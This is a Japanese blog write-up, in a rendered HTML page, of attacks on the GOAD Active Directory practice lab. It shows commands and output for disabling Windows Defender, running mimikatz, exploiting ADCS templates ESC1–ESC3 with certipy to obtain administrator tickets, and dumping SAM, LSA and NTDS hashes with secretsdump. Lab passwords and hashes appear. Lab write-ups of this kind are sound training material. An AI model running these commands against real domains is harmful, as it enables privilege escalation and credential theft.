@@ -1,0 +1,567 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>GOAD Writeup Ch3 | x64.moe</title>
+<meta name=keywords content><meta name=description content="Round 3
+meereenの認証情報をAdministrator/P@ssw0rd! にした。
+meereenの配下のbraavosとかはADCSだ。せっかくだし、ADCS周りも攻撃しようじゃないか。
+THEFT 1  Exporting certificates using the CryptoAPI
+mimikatz.exeを用いて証明書を窃取する。
+と思ったけどWindows Defenderでmimikatzが検知される。
+khal.drogoはやりたい放題のアカウントなのでWindows Defenderのリアルタイムプロテクションを止める。
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents> whoami 
+essos\khal.drogo
+
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
+これでmimikatz.exeを実行してみる"><meta name=author content="FAMASoon"><link rel=canonical href=http://localhost:1313/posts/goad_writeupch3/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/goad_writeupch3/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-ZJPXHR8YPR"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-ZJPXHR8YPR")}</script><meta property="og:title" content="GOAD Writeup Ch3"><meta property="og:description" content="Round 3
+meereenの認証情報をAdministrator/P@ssw0rd! にした。
+meereenの配下のbraavosとかはADCSだ。せっかくだし、ADCS周りも攻撃しようじゃないか。
+THEFT 1  Exporting certificates using the CryptoAPI
+mimikatz.exeを用いて証明書を窃取する。
+と思ったけどWindows Defenderでmimikatzが検知される。
+khal.drogoはやりたい放題のアカウントなのでWindows Defenderのリアルタイムプロテクションを止める。
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents> whoami 
+essos\khal.drogo
+
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
+これでmimikatz.exeを実行してみる"><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/goad_writeupch3/"><meta property="og:image" content="http://localhost:1313/static/famasoon.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-26T00:00:00+00:00"><meta property="article:modified_time" content="2024-10-26T00:00:00+00:00"><meta property="og:site_name" content="x64.moe"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/static/famasoon.jpg"><meta name=twitter:title content="GOAD Writeup Ch3"><meta name=twitter:description content="Round 3
+meereenの認証情報をAdministrator/P@ssw0rd! にした。
+meereenの配下のbraavosとかはADCSだ。せっかくだし、ADCS周りも攻撃しようじゃないか。
+THEFT 1  Exporting certificates using the CryptoAPI
+mimikatz.exeを用いて証明書を窃取する。
+と思ったけどWindows Defenderでmimikatzが検知される。
+khal.drogoはやりたい放題のアカウントなのでWindows Defenderのリアルタイムプロテクションを止める。
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents> whoami 
+essos\khal.drogo
+
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
+これでmimikatz.exeを実行してみる"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"GOAD Writeup Ch3","item":"http://localhost:1313/posts/goad_writeupch3/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"GOAD Writeup Ch3","name":"GOAD Writeup Ch3","description":"Round 3 meereenの認証情報をAdministrator/P@ssw0rd! にした。\nmeereenの配下のbraavosとかはADCSだ。せっかくだし、ADCS周りも攻撃しようじゃないか。\nTHEFT 1 Exporting certificates using the CryptoAPI mimikatz.exeを用いて証明書を窃取する。\nと思ったけどWindows Defenderでmimikatzが検知される。\nkhal.drogoはやりたい放題のアカウントなのでWindows Defenderのリアルタイムプロテクションを止める。\n*Evil-WinRM* PS C:\\Users\\khal.drogo\\Documents\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======= SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeSecurityPrivilege Manage auditing and security log Enabled SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeSystemProfilePrivilege Profile system performance Enabled SeSystemtimePrivilege Change the system time Enabled SeProfileSingleProcessPrivilege Profile single process Enabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled SeCreatePagefilePrivilege Create a pagefile Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeDebugPrivilege Debug programs Enabled SeSystemEnvironmentPrivilege Modify firmware environment values Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeUndockPrivilege Remove computer from docking station Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled SeCreateSymbolicLinkPrivilege Create symbolic links Enabled SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled *Evil-WinRM* PS C:\\Users\\khal.drogo\\Documents\u0026gt; whoami essos\\khal.drogo *Evil-WinRM* PS C:\\Users\\khal.drogo\\Documents\u0026gt; Set-MpPreference -DisableRealtimeMonitoring $true これでmimikatz.exeを実行してみる\n","keywords":[],"articleBody":"Round 3 meereenの認証情報をAdministrator/P@ssw0rd! にした。\nmeereenの配下のbraavosとかはADCSだ。せっかくだし、ADCS周りも攻撃しようじゃないか。\nTHEFT 1 Exporting certificates using the CryptoAPI mimikatz.exeを用いて証明書を窃取する。\nと思ったけどWindows Defenderでmimikatzが検知される。\nkhal.drogoはやりたい放題のアカウントなのでWindows Defenderのリアルタイムプロテクションを止める。\n*Evil-WinRM* PS C:\\Users\\khal.drogo\\Documents\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======= SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeSecurityPrivilege Manage auditing and security log Enabled SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeSystemProfilePrivilege Profile system performance Enabled SeSystemtimePrivilege Change the system time Enabled SeProfileSingleProcessPrivilege Profile single process Enabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled SeCreatePagefilePrivilege Create a pagefile Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeDebugPrivilege Debug programs Enabled SeSystemEnvironmentPrivilege Modify firmware environment values Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeUndockPrivilege Remove computer from docking station Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled SeCreateSymbolicLinkPrivilege Create symbolic links Enabled SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled *Evil-WinRM* PS C:\\Users\\khal.drogo\\Documents\u003e whoami essos\\khal.drogo *Evil-WinRM* PS C:\\Users\\khal.drogo\\Documents\u003e Set-MpPreference -DisableRealtimeMonitoring $true これでmimikatz.exeを実行してみる\n*Evil-WinRM* PS C:\\Users\\khal.drogo\\Documents\u003e ./mimikatz.exe \"crypto::certificates /export\" \"crypto::capi\" \"crypto::certificates /export\" \"exit\" .#####. mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u003e https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' \u003e https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz(commandline) # crypto::certificates /export * System Store : 'CURRENT_USER' (0x00010000) * Store : 'My' mimikatz(commandline) # crypto::capi Local CryptoAPI RSA CSP patched Local CryptoAPI DSS CSP patched mimikatz(commandline) # crypto::certificates /export * System Store : 'CURRENT_USER' (0x00010000) * Store : 'My' mimikatz(commandline) # exit Bye! 何も出てこないし、pfxとか盗めん…。\n仕方がない別のアプローチで攻撃する\nDomain Privilege escalation 適当にESC1-8あたりを試してみる\nESCが何かはSpectoropsの資料がよくまとまっている\nhttps://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf\n┌──(kali㉿kali)-[~/goad/braavos] └─$ certipy-ad find -u 'khal.drogo' -p horse -dc-ip 192.168.56.12 -vulnerable -enabled Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 38 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 16 enabled certificate templates [*] Trying to get CA configuration for 'ESSOS-CA' via CSRA [*] Got CA configuration for 'ESSOS-CA' [*] Saved BloodHound data to '20241023161533_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to '20241023161533_Certipy.txt' [*] Saved JSON output to '20241023161533_Certipy.json' ┌──(kali㉿kali)-[~/goad/braavos] └─$ cat 20241023161533_Certipy.txt Certificate Authorities 0 CA Name : ESSOS-CA DNS Name : braavos.essos.local Certificate Subject : CN=ESSOS-CA, DC=essos, DC=local Certificate Serial Number : 5120F6B8733E26BC43F390382A65D06B Certificate Validity Start : 2024-08-11 03:37:50+00:00 Certificate Validity End : 2029-08-11 03:47:49+00:00 Web Enrollment : Enabled User Specified SAN : Enabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : ESSOS.LOCAL\\Administrators Access Rights ManageCertificates : ESSOS.LOCAL\\Administrators ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Enterprise Admins ManageCa : ESSOS.LOCAL\\Administrators ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Enterprise Admins Enroll : ESSOS.LOCAL\\Authenticated Users [!] Vulnerabilities ESC6 : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022 ESC8 : Web Enrollment is enabled and Request Disposition is set to Issue Certificate Templates 0 Template Name : ESC4 Display Name : ESC4 Certificate Authorities : ESSOS-CA Enabled : True Client Authentication : False Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : False Certificate Name Flag : SubjectRequireDirectoryPath SubjectRequireEmail SubjectAltRequireUpn Enrollment Flag : AutoEnrollment PublishToDs PendAllRequests IncludeSymmetricAlgorithms Private Key Flag : ExportableKey Extended Key Usage : Code Signing Requires Manager Approval : True Requires Key Archival : False Authorized Signatures Required : 1 Validity Period : 1 year Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : ESSOS.LOCAL\\Domain Users Object Control Permissions Owner : ESSOS.LOCAL\\Enterprise Admins Full Control Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\khal.drogo ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Owner Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\khal.drogo ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Dacl Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\khal.drogo ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Property Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\khal.drogo ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins [!] Vulnerabilities ESC4 : 'ESSOS.LOCAL\\\\khal.drogo' has dangerous permissions 1 Template Name : ESC3-CRA Display Name : ESC3-CRA Certificate Authorities : ESSOS-CA Enabled : True Client Authentication : False Enrollment Agent : True Any Purpose : False Enrollee Supplies Subject : False Certificate Name Flag : SubjectAltRequireUpn Enrollment Flag : AutoEnrollment Private Key Flag : 16842752 Extended Key Usage : Certificate Request Agent Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 1 year Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : ESSOS.LOCAL\\Domain Users Object Control Permissions Owner : ESSOS.LOCAL\\Enterprise Admins Full Control Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Owner Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Dacl Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Property Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins [!] Vulnerabilities ESC3 : 'ESSOS.LOCAL\\\\Domain Users' can enroll and template has Certificate Request Agent EKU set 2 Template Name : ESC2 Display Name : ESC2 Certificate Authorities : ESSOS-CA Enabled : True Client Authentication : True Enrollment Agent : True Any Purpose : True Enrollee Supplies Subject : False Certificate Name Flag : SubjectAltRequireUpn Enrollment Flag : AutoEnrollment Private Key Flag : 16842752 Extended Key Usage : Any Purpose Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 1 year Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : ESSOS.LOCAL\\Domain Users Object Control Permissions Owner : ESSOS.LOCAL\\Enterprise Admins Full Control Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Owner Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Dacl Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Property Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins [!] Vulnerabilities ESC2 : 'ESSOS.LOCAL\\\\Domain Users' can enroll and template can be used for any purpose ESC3 : 'ESSOS.LOCAL\\\\Domain Users' can enroll and template has Certificate Request Agent EKU set 3 Template Name : ESC1 Display Name : ESC1 Certificate Authorities : ESSOS-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : None Private Key Flag : 16842752 Extended Key Usage : Client Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 1 year Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : ESSOS.LOCAL\\Domain Users Object Control Permissions Owner : ESSOS.LOCAL\\Enterprise Admins Full Control Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Owner Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Dacl Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins Write Property Principals : ESSOS.LOCAL\\Domain Admins ESSOS.LOCAL\\Local System ESSOS.LOCAL\\Enterprise Admins [!] Vulnerabilities ESC1 : 'ESSOS.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication ラボ環境だから当たり前といえば当たり前だがESC1-8で遊べそう。\nESC1 ┌──(kali㉿kali)-[~/goad/braavos] └─$ certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC1 -upn 'administrator@essos.local' Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 9 [*] Got certificate with UPN 'administrator@essos.local' [*] Certificate has no object SID [*] Saved certificate and private key to 'administrator.pfx' ┌──(kali㉿kali)-[~/goad/braavos] └─$ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@essos.local [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b ┌──(kali㉿kali)-[~/goad/braavos] └─$ ls 20241023161533_Certipy.json 20241023161533_Certipy.txt 20241023161533_Certipy.zip administrator.ccache administrator.pfx asreproast.hash braavos.nmap missandei.ccache というわけでadministratorのTGTゲット\nESC 2 ┌──(kali㉿kali)-[~/goad/braavos] └─$ certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC2 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 10 [*] Got certificate with UPN 'khal.drogo@essos.local' [*] Certificate has no object SID [*] Saved certificate and private key to 'khal.drogo.pfx' ┌──(kali㉿kali)-[~/goad/braavos] └─$ certipy-ad auth -pfx khal.drogo.pfx -dc-ip 192.168.56.12 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: khal.drogo@essos.local [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to 'khal.drogo.ccache' [*] Trying to retrieve NT hash for 'khal.drogo' [*] Got hash for 'khal.drogo@essos.local': aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021 ESC2もできた\nESC 3 ──(kali㉿kali)-[~/goad/braavos] └─$ certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC3-CRA Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 11 [*] Got certificate with UPN 'khal.drogo@essos.local' [*] Certificate has no object SID [*] Saved certificate and private key to 'khal.drogo.pfx' ┌──(kali㉿kali)-[~/goad/braavos] └─$ certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC3 -on-behalf-of 'essos\\administrator' -pfx khal.drogo.pfx Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 12 [*] Got certificate with UPN 'administrator@essos.local' [*] Certificate has no object SID [*] Saved certificate and private key to 'administrator.pfx' ┌──(kali㉿kali)-[~/goad/braavos] └─$ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@essos.local [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b はい、またadministratorのTGT取得\nもうadministratorのTGT取得できているので他のESCなんとかは試さない\nあとはadministratorのチケットを使って色々する\n┌──(kali㉿kali)-[~/goad/braavos] └─$ export KRB5CCNAME=administrator.ccache ┌──(kali㉿kali)-[~/goad/braavos] └─$ impacket-secretsdump -k meereen.essos.local Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x27f348488bf565282d6c09846f0b195a [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC ESSOS\\MEEREEN$:plain_password_hex:6b9ebce56793e6984d7266005fafa1f19d404568425240aafdf3116c41ff945d128492d874640bd5ab6fe258c5daa085efb6dbc11cdc7d700cc45ddfddbb540acbf581788f0cfe49eb4675b059247a769ea05bff6a0ea5f8af86a5d8ab766556e688ef3be8302fe626616556244d22ae97417048fe9189e84d1193b77e318de5267b06aed27911237586b80a91ffc17312e7e561757eea0fa1b5ebac4c3a8e21252b4e611e7a92da00c94dd307dc86bc4e239b176c063255e46538009d5f5b6e0349504934361304c7e6ef99c50e33bc9c1d55832c996ad416f377ed86c861ac11787a24cbfa8ed3622ab7b49d89b32a ESSOS\\MEEREEN$:aad3b435b51404eeaad3b435b51404ee:f05997d79fa50e0346a4d593d8eb1741::: [*] DPAPI_SYSTEM dpapi_machinekey:0x8a316db332fd5d07200bd16c0c178e3cde2ecf31 dpapi_userkey:0xb1c344e7203277156a6b15782a58e16577349587 [*] NL$KM 0000 48 12 38 16 FC 21 D8 4B 13 02 2E EF A9 E1 B3 FF H.8..!.K........ 0010 C8 F3 E1 9B 62 AC A5 2C F8 3E 07 1B 66 C5 93 AD ....b..,.\u003e..f... 0020 06 16 32 5D 1D 00 C0 84 9B EF 1F 84 1C B1 E3 F3 ..2]............ 0030 41 8A ED 9D 0A 6A 75 6F EC 7B D9 79 CF 8E 24 D9 A....juo.{.y..$. NL$KM:48123816fc21d84b13022eefa9e1b3ffc8f3e19b62aca52cf83e071b66c593ad0616325d1d00c0849bef1f841cb1e3f3418aed9d0a6a756fec7bd979cf8e24d9 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54798535f08dafb2f3ab805bb312961d::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b::: daenerys.targaryen:1112:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a::: essos.local\\viserys.targaryen:1113:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: 